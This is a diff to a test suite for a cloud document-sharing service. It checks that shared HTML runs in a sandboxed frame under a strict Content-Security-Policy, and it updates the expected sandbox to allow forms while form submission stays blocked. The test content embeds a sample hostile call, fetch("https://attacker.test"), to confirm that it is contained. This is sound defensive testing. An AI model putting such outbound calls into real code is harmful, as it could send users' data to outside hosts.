@@ -477,11 +477,12 @@ describe("Cloud document share HTTP boundary", () => {
     expect(contentHtml).toContain("Operational")
     expect(contentHtml).toContain("color:tomato")
     // Its own script is there, in a frame that runs scripts and reaches
-    // nothing: no network, no forms, no pop-ups, no origin of its own.
+    // nothing: no network, no pop-ups, no origin of its own. A form reaches
+    // the page's submit handler and sends nowhere.
     expect(contentHtml).toContain('fetch("https://attacker.test")')
     const policy = content.headers.get("Content-Security-Policy") ?? ""
     expect(policy).toStartWith(
-      "sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline'"
+      "sandbox allow-scripts allow-forms; default-src 'none'; script-src 'unsafe-inline'"
     )
     expect(policy).toContain("connect-src 'none'")
     expect(policy).toContain("form-action 'none'")
